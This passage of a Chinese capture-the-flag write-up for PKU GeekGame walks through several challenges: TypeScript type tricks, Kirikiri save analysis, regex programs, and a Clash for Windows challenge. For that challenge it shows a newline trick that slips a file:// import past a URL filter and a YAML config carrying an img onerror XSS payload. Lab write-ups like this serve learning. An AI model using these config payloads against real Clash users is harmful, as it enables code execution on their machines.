+<p><img src="/img/geek3/route.png" srcset="/img/loading.gif" lazyload /></p>
+<p>看起来应该是Flask的路由机制将 <code>"/sw"</code> 自动重定向到
+<code>"/sw/"</code>
+，可是一旦添加这个斜杠SW就无法注册到根目录。猜测可能要利用程序忽略subpath的特性进行路径穿越，但构造不出有效的url，摆了。</p>
+<h2 id="简单的打字稿">简单的打字稿</h2>
+<h3 id="flag1-5">flag1</h3>
+<p>不了解TypeScript，居然还能这么定义类型？先查点资料：</p>
+<blockquote>
+<p>在线TypeScript编译器：<a
+target="_blank" rel="noopener" href="https://www.typescriptlang.org/play">TS Playground</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64446259">浅谈 TypeScript
+类型系统 - 知乎</a></p>
+</blockquote>
+<p>这种具有固定取值的类型叫做单例类型（Singleton
+Type），总之先在线上平台试一试，似乎所有针对变量的函数都无法作用于type，只有强行赋值的报错可以展示出flag1的值：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> flag1 = <span class="hljs-string">&#x27;flag&#123;...&#125;&#x27;</span><br><span class="hljs-keyword">type</span> flag2 = <span class="hljs-built_in">object</span> | &#123; <span class="hljs-keyword">new</span> (): &#123; <span class="hljs-attr">v</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-function">(<span class="hljs-params">a: (a: <span class="hljs-built_in">unknown</span>, b: &#123; <span class="hljs-string">&#x27;flag&#123;...&#125;&#x27;</span>: <span class="hljs-built_in">never</span> &#125; &amp; Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;) =&gt; <span class="hljs-built_in">never</span></span>) =&gt;</span> <span class="hljs-built_in">unknown</span> &#125; &#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">c</span>: flag1 = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// Error: Type &#x27;1&#x27; is not assignable to type &#x27;&quot;flag&#123;...&#125;&quot;&#x27;.</span><br></code></pre></td></tr></table></figure>
+<p>查看题目源码，如果输出当中包括字符串<code>flag</code>，就会被无情地屏蔽掉，所以如果能对flag1的内容进行某种转义就可以绕过屏蔽词。继续查资料，发现了神奇的类型体操，真是大开眼界：
+&gt; &gt; <a
+target="_blank" rel="noopener" href="https://wangdoc.com/typescript/operator">TypeScript教程 /
+类型运算符</a> &gt; &gt; <a
+target="_blank" rel="noopener" href="https://juejin.cn/post/7129864202604249096">玩转 TS
+模板字符串类型</a> &gt; &gt; TypeScript类型体操，用类型运算实现：<a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/427309936">Lisp解释器</a>、<a
+target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/426966480">中国象棋</a> （啊？）</p>
+<p>总之找到一个可以反转字符串的轮子，顺利拿到flag1：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReverseString</span>&lt;<span class="hljs-title class_">Str</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-title class_">Str</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123; infer First &#125;</span><span class="hljs-subst">$&#123; infer Rest &#125;</span>`</span> ? <span class="hljs-string">`<span class="hljs-subst">$&#123; ReverseString&lt;Rest&gt; &#125;</span><span class="hljs-subst">$&#123; First &#125;</span>`</span> : <span class="hljs-title class_">Str</span>;<br><br><span class="hljs-keyword">type</span> T = <span class="hljs-title class_">ReverseString</span>&lt;flag1&gt;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">x</span>: T = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// error: TS2322 [ERROR]: Type &#x27;1&#x27; is not assignable to type &#x27;&quot;&#125;gNal_ysae_ooOT_ROf_Ga1f_Ys4E_0oOt&#123;galf&quot;&#x27;.</span><br></code></pre></td></tr></table></figure>
+<h3 id="flag2-5">flag2</h3>
+<p>flag2在类型的字符串运算的基础上，增加了函数类型。这里最难的是把后半部分从联合类型中分离出来，因为函数本身也属于object类型，常规的<code>Exclude</code>方法不起作用。如果用<code>Extract</code>方法，就需要定义一个包含
+flag2 且不包含 object
+的类型，通过把flag2中未知的部分定义为any可以实现。接下来就容易多了，用<code>infer</code>可以提取出包含flag2的类型，再用<code>keyof</code>提取出相应的变量名，最后将字符串反转，拿到flag2。</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// type f2 = Exclude&lt;flag2, object&gt; 这样写无效</span><br><span class="hljs-keyword">type</span> f2 = <span class="hljs-title class_">Extract</span>&lt;flag2, &#123; <span class="hljs-keyword">new</span> (): &#123; <span class="hljs-attr">v</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-function">(<span class="hljs-params">a: (a: <span class="hljs-built_in">unknown</span>, b: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">never</span></span>) =&gt;</span> <span class="hljs-built_in">unknown</span> &#125; &#125;&gt;<br><br><span class="hljs-keyword">type</span> getb&lt;T&gt; = T <span class="hljs-keyword">extends</span> &#123;<span class="hljs-title function_">new</span>(): &#123;<span class="hljs-attr">v</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-function">(<span class="hljs-params">a: (a: <span class="hljs-built_in">unknown</span>, b: (infer X) &amp; Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;) =&gt; <span class="hljs-built_in">never</span></span>) =&gt;</span> <span class="hljs-built_in">unknown</span>&#125;&#125; ? X : <span class="hljs-built_in">never</span><br><br><span class="hljs-keyword">type</span> f22 = getb&lt;f2&gt;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReverseString</span>&lt;<span class="hljs-title class_">Str</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-title class_">Str</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123; infer First &#125;</span><span class="hljs-subst">$&#123; infer Rest &#125;</span>`</span> ? <span class="hljs-string">`<span class="hljs-subst">$&#123; ReverseString&lt;Rest&gt; &#125;</span><span class="hljs-subst">$&#123; First &#125;</span>`</span> : <span class="hljs-title class_">Str</span>;<br><br><span class="hljs-keyword">type</span> res = <span class="hljs-title class_">ReverseString</span>&lt;keyof f22&gt;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">x</span>: res = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// error: TS2322 [ERROR]: Type &#x27;1&#x27; is not assignable to type &#x27;&quot;&#125;!N0HTYp_naHt_ReTTeb_GaLf_ST&#123;galf&quot;&#x27;.</span><br></code></pre></td></tr></table></figure>
+<h2 id="非法所得">非法所得</h2>
+<p><del>那一天，我回想起了被叶子的新歌支配的恐惧</del></p>
+<h3 id="flag1-6">flag1</h3>
+<p>审计源码，基本看懂了题目的逻辑：</p>
+<blockquote>
+<ol type="1">
+<li><p>flag1存放在配置文件<code>/app/profiles/flag.yml</code>里，flag2需要控制靶机访问原神学院ys.pku.edu.cn获得。</p></li>
+<li><p>整个环境大概包括两部分文件：<code>/app</code>是题目的网页端；<code>/usr/share/novnc</code>是VNC界面的配置文件，可以通过websockify直接读取。</p></li>
+<li><p>网页端api包括：</p>
+<ul>
+<li><p>查看Clash各项状态，但是Proxies只能看到Rule</p></li>
+<li><p>导入配置文件，但是限制只能是http或https链接</p></li>
+<li><p>浏览网站，但是只能访问pku.edu.cn域名下的网站</p></li>
+</ul></li>
+</ol>
+</blockquote>
+<p>那么目标首先是把本地的flag.yml导进去，http协议做不到，需要想办法导入file伪协议。经过无数次尝试之后，突然意识到整个环境是在完全模拟实际的输入和点击，那么只要把file藏在http和换行符后面，就可以模拟出连续的两次导入，像下面这样。</p>
+<p><img src="/img/geek3/import.png" srcset="/img/loading.gif" lazyload /></p>
+<p><img src="/img/geek3/clash1.png" srcset="/img/loading.gif" lazyload /></p>
+<p>成功导入配置文件，但flag藏在Proxies里，从Rule界面仍然看不到。实在想不到办法，就去查Clash是否有历史漏洞，发现v0.19.8还真有<a
+target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">大</a>
+<a target="_blank" rel="noopener" href="https://www.ctfiot.com/125056.html">问</a> <a
+target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=4AnapDDMlyI">题</a>，恶意构造的配置文件可以直接执行任意js代码！……理论上是这样，但是实际注入完全相同的yml文件并不能弹出计算器。试了半天只有alert可以正常弹出，但是一旦弹了alert就无法进行后续操作，只能重启环境，太憨憨了，一阶段卡在了这里。</p>
+<p>二阶段并没有多出有用的提示，查了一下<a
+target="_blank" rel="noopener" href="https://clash.gitbook.io/doc/restful-api">RESTful
+API</a>可以实现任意位置任意文件下载，但大概是用来导入本地文件的，没找到其他用途，所以还是只能依赖一次性的alert找信息。总之花了很久试出来Clash的界面也是个html结构，里面有正常的DOM树。通过无数次<code>alert(document.body.children[0].xxx.innerHTML)</code>成功定位到了Proxies的Global选项卡，然后模拟<strong>C-L-I-C-K-!</strong>
+切换页面，重新导入flag.yml即可看到flag。最后试出来的几个关键元素如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 左侧边栏 left-side: </span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">// 代理窗口 proxy-view: </span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;main-proxy-view&quot;</span>)<br><br><span class="hljs-comment">// 切换到 General 选项卡: </span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;main-proxy-view&quot;</span>).<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">click</span>()<br><br><span class="hljs-comment">// 代理列表 proxy-list: </span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;main-proxy-view&quot;</span>).<span class="hljs-property">children</span>[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">// 切换到 proxy 3: </span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;main-proxy-view&quot;</span>).<span class="hljs-property">children</span>[<span class="hljs-number">1</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">0</span>].<span class="hljs-property">children</span>[<span class="hljs-number">1</span>].<span class="hljs-property">children</span>[<span class="hljs-number">2</span>].<span class="hljs-title function_">click</span>()<br></code></pre></td></tr></table></figure>
+<p>导入以下脚本，可以在打开Proxies时自动切换到General选项卡：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">port:</span> <span class="hljs-number">7890</span><br><span class="hljs-attr">allow-lan:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">mode:</span> <span class="hljs-string">Rule</span><br><span class="hljs-attr">log-level:</span> <span class="hljs-string">info</span><br><span class="hljs-attr">external-controller:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:9090</span><br><span class="hljs-attr">proxies:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">flag</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">socks5</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">1926</span><br>    <span class="hljs-attr">skip-cert-verify:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-attr">proxy-groups:</span><br>  <span class="hljs-bullet">-</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">&lt;img/src=&quot;1&quot;/onerror=document.getElementById(&quot;main-proxy-view&quot;).children[0].children[0].children[0].click()&gt;</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">select</span><br>    <span class="hljs-attr">proxies:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">flag</span><br><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;DOMAIN-SUFFIX,pku.edu.cn,flag&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GEOIP,CN,DIRECT&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;MATCH,DIRECT&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/img/geek3/clash2.png" srcset="/img/loading.gif" lazyload /></p>
+<p>PS：我认为这套做法实在是太抽象了……flag1做得磕磕绊绊，整个做下来没有一点技术，感觉全是非预期
+(╯°Д°)╯︵ ┻━┻</p>
+<h3 id="flag2-6">flag2</h3>
+<p>流程打通后，flag2的思路更直接，只要通过靶机的浏览器访问到ys.pku.edu.cn就行。一开始以为这个网站隐藏在服务器端，flag.yml里的端口号可以实现本地反代，但是仍然不能访问，那就只能手写一个代理了……</p>
+<p>重新注入一个配置文件，把代理服务器改成本机ip，访问网站时确实可以接收到socket数据，但是没找到现成的轮子，二阶段摆了。</p>
+<h2 id="汉化绿色版免费下载">汉化绿色版免费下载</h2>
+<p><a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-3rd/codes/krkr.ipynb">code</a></p>
+<h3 id="flag1-7">flag1</h3>
+<p>手玩一遍，输入两次同样的字符串就能进入通关界面，看起来像是有串字符被隐藏了。直接上Cheat
+Engine，在内存里搜索字符串<code>Flag 1</code>拿到答案。</p>
+<p><img src="/img/geek3/CE.png" srcset="/img/loading.gif" lazyload /></p>
+<h3 id="flag2-7">flag2</h3>
+<p>第一部分的答案提示要解压xp3文件，搜了一下才发现原来用的是<del>galgame</del>视觉小说游戏引擎Kirikiri，xp3是其专属的压缩格式，可以用<a
+target="_blank" rel="noopener" href="https://github.com/arcusmaximus/KirikiriTools/releases">KirikiriTools</a>里的XP3Viewer解压。解压后的文件夹包括了大量游戏文件，并且能直接取代原本的xp3。</p>
+<p>最早的想法是修改配置文件<code>Config.tjs</code>，看能不能打开查看历史对话的功能，但琢磨了一会觉得之前没保存的话现在打开也看不到。继续检查代码，在<code>scenario/</code>里找到了控制游戏逻辑的代码，比对两次输入的字符串是依靠自定义的哈希算法，进行特定运算后
+<em>取膜</em>
+得到。提示说还有其他信息，那剩余的关键信息只能是在存档里了。存档同样可以用<a
+target="_blank" rel="noopener" href="https://github.com/arcusmaximus/KirikiriTools/releases">KirikiriTools</a>里的KirikiriDescrambler解开。</p>
+<p>为了控制变量以解析存档里的信息，我重新解压了一遍游戏，输入<code>flag&#123;AEIOU&#125;</code>后直接存档退出，然后检查存档文件的变化。两个<code>kdt</code>文件比对之后只有哈希值不同，完整的操作路径并没有被记录下来，反倒是<code>datasu.ksd</code>里多出了不少信息。这个文件应该是全局的信息记录，可以观察到<code>trail_round1_sel_*</code>对5个字母的记录各多出一个，因此可以确定原始数值就是出题人分别选择5个字母的次数<code>&#123;"A": 6, "E": 3, "I": 1, "O":6, "U":0&#125;</code>。对这些字母枚举全排列，找到符合哈希值的排列方式，就得到出题人所输入的字符串。</p>
+<p>PS：查<a
+target="_blank" rel="noopener" href="https://iyn.me/i/post-45.html">资料</a>时发现Kirikiri甚至会在存档的画面预览缩略图中存信息，真是太奇妙了（？）</p>
+<h2 id="关键词过滤喵谢谢喵">关键词过滤喵，谢谢喵</h2>
+<p>Human Resource Machine &amp; 7 Billion Humans
+玩家狂喜喵！<del>建议增设代码行数和运算速度挑战喵，谢谢喵！</del></p>
+<h3 id="flag1-字数统计喵">flag1 字数统计喵</h3>
+<p>思路是先把所有字符统一成相同的形式（字母"x"），然后以十合一的方式模拟进位。一开始手动处理了10位十进制数，后来debug的时候改进成更优雅的循环形式了。这里主要的corner
+case就是空文件和换行符，评测程序的文件名给出了提示，还是很友好的。</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">把【[\s\S]】替换成【x】喵</span><br><span class="language-xml"></span><br><span class="language-xml">loop：</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;10&#125;</span><span class="language-xml">】替换成【u】喵</span><br><span class="language-xml">如果看到【x】就跳转到【sum】喵</span><br><span class="language-xml"></span><br><span class="language-xml">如果没看到【\d】就跳转到【first】喵</span><br><span class="language-xml"></span><br><span class="language-xml">把【(\d+)$】替换成【0\g&lt;1&gt;】喵</span><br><span class="language-xml">如果看到【$】就跳转到【sum】喵</span><br><span class="language-xml"></span><br><span class="language-xml">first：</span><br><span class="language-xml">把【$】替换成【0】喵</span><br><span class="language-xml"></span><br><span class="language-xml">sum：</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;9&#125;</span><span class="language-xml">】替换成【9】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;8&#125;</span><span class="language-xml">】替换成【8】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;7&#125;</span><span class="language-xml">】替换成【7】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;6&#125;</span><span class="language-xml">】替换成【6】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;5&#125;</span><span class="language-xml">】替换成【5】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;4&#125;</span><span class="language-xml">】替换成【4】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;3&#125;</span><span class="language-xml">】替换成【3】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;2&#125;</span><span class="language-xml">】替换成【2】喵</span><br><span class="language-xml">把【x</span><span class="hljs-template-variable">&#123;1&#125;</span><span class="language-xml">】替换成【1】喵</span><br><span class="language-xml"></span><br><span class="language-xml">把【u】替换成【x】喵</span><br><span class="language-xml">如果看到【x】就跳转到【loop】喵</span><br><span class="language-xml"></span><br><span class="language-xml">谢谢喵</span><br></code></pre></td></tr></table></figure>
+<h3 id="flag2-排序喵">flag2 排序喵</h3>
+<p>一步步按冒泡排序的逻辑处理，大概需要以下几步：</p>
+<ol type="1">
+<li>先把多余的空行清洗干净</li>
+<li>设定一个指针置于首行，表示当前正在处理哪一行</li>
+<li>把当前行与下一行比较，如果下一行更短就交换位置，然后将指针下移一行</li>
+<li>如果指针到达最后一行，
+说明一轮排序完成，当前末行不需要参与下一轮排序，打上标记，指针重新置顶</li>
+<li>每行都打过标记后排序完成，删掉所有标记和指针符号</li>
+</ol>
+<p>在比大小的过程中，具体做法是先把两行各复制一遍，然后重复做成对删除，先被删完的就是更短的，然后利用<code>\g&lt;1&gt;</code>交换位置。另外由于文本中没有emoji，可以用各种emoji代表指针和特殊标记。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># 👆 line pointer<br># 👇 finish mark<br># 🐘 separator<br><br>把【$】替换成【<span class="hljs-symbol">\n</span>】喵<br>重复把【<span class="hljs-symbol">\n</span><span class="hljs-symbol">\n</span>】替换成【<span class="hljs-symbol">\n</span>】喵<br>如果没看到【.*<span class="hljs-symbol">\n</span>.*<span class="hljs-symbol">\n</span>】就跳转到【break】喵<br>把【(.*)<span class="hljs-symbol">\n</span>】替换成【\g&lt;1&gt;🐘\g&lt;1&gt;<span class="hljs-symbol">\n</span>】喵<br><br>loop：<br>把【^】替换成【👆】喵<br><br>swap：<br>重复把【(👆.*).(🐘.*<span class="hljs-symbol">\n</span>.*).(🐘.*<span class="hljs-symbol">\n</span>)】替换成【\g&lt;1&gt;\g&lt;2&gt;\g&lt;3&gt;】喵<br>如果看到【👆🐘】就跳转到【less】喵<br><br>greater：<br>把【👆.*🐘(.*)<span class="hljs-symbol">\n</span>🐘(.*)<span class="hljs-symbol">\n</span>】替换成【\g&lt;2&gt;🐘\g&lt;2&gt;<span class="hljs-symbol">\n</span>👆\g&lt;1&gt;🐘\g&lt;1&gt;<span class="hljs-symbol">\n</span>】喵<br>如果看到【^】就跳转到【next】喵<br><br>less：<br>把【👆🐘(.*)<span class="hljs-symbol">\n</span>.*🐘(.*)<span class="hljs-symbol">\n</span>】替换成【\g&lt;1&gt;🐘\g&lt;1&gt;<span class="hljs-symbol">\n</span>👆\g&lt;2&gt;🐘\g&lt;2&gt;<span class="hljs-symbol">\n</span>】喵<br><br>next：<br>如果看到【👆.*<span class="hljs-symbol">\n</span>$】就跳转到【loop_back】喵<br>如果看到【👆.*<span class="hljs-symbol">\n</span>👇】就跳转到【loop_back】喵<br><br>如果看到【^】就跳转到【swap】喵<br><br>loop_back：<br>把【👆】替换成【👇】喵<br>如果看到【^.*<span class="hljs-symbol">\n</span>👇】就跳转到【end】喵<br>如果看到【^】就跳转到【loop】喵<br><br>end：<br>重复把【.+🐘】替换成【🐘】喵<br>把【.*🐘(.*<span class="hljs-symbol">\n</span>)】替换成【\g&lt;1&gt;】喵<br><br>break：<br>重复把【^<span class="hljs-symbol">\n</span>】替换成【】喵<br>重复把【<span class="hljs-symbol">\n</span>$】替换成【】喵<br>谢谢喵<br></code></pre></td></tr></table></figure>
+<h3 id="flag3-brainfuck-喵">flag3 Brainfuck 喵</h3>
+<p>照着<a
+target="_blank" rel="noopener" href="https://esolangs.org/wiki/Brainfuck">语法描述</a>一步步实现就好了喵！注意<code>.+[]</code>都需要转义喵！</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 💀 output pointer</span><br><span class="hljs-comment"># 👉 memory pointer, on the left of unit</span><br><span class="hljs-comment"># 💉 depth counter</span><br><span class="hljs-comment"># 💊 code pointer</span><br><span class="hljs-comment"># 🐘 separator</span><br><br>把【[^&lt;&gt;+-.<span class="hljs-string">\[\]]】替换成【】喵</span><br>把【^】替换成【💊】喵<br>把【^】替换成【💉🐘】喵<br>把【^】替换成【👉 🐘】喵<br>把【^】替换成【💀🐘】喵<br><br><br><span class="hljs-keyword">loop</span>：<br>如果看到【💊&gt;】就跳转到【f1】喵<br>如果看到【💊&lt;】就跳转到【f2】喵<br>如果看到【💊<span class="hljs-string">\+】就跳转到【f3】喵</span><br>如果看到【💊-】就跳转到【f4】喵<br>如果看到【💊<span class="hljs-string">\.】就跳转到【f5】喵</span><br>如果看到【💊<span class="hljs-string">\[】就跳转到【f6】喵</span><br>如果看到【💊<span class="hljs-string">\]】就跳转到【f7】喵</span><br><br>如果看到【💊$】就跳转到【end】喵<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f1：<br>把【👉(a*) 】替换成【<span class="hljs-string">\g&lt;1&gt;</span> 👉】喵<br>把【👉🐘】替换成【👉 🐘】喵<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f2：<br>把【(a* )👉】替换成【👉<span class="hljs-string">\g&lt;1&gt;】喵</span><br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f3：<br>把【👉】替换成【👉a】喵<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span class="hljs-keyword">loop</span>】喵<br><br><br>f4：<br>把【👉a】替换成【👉】喵<br>把【💊(.)】替换成【<span class="hljs-string">\g&lt;1&gt;💊】喵</span><br>如果看到【^】就跳转到【<span 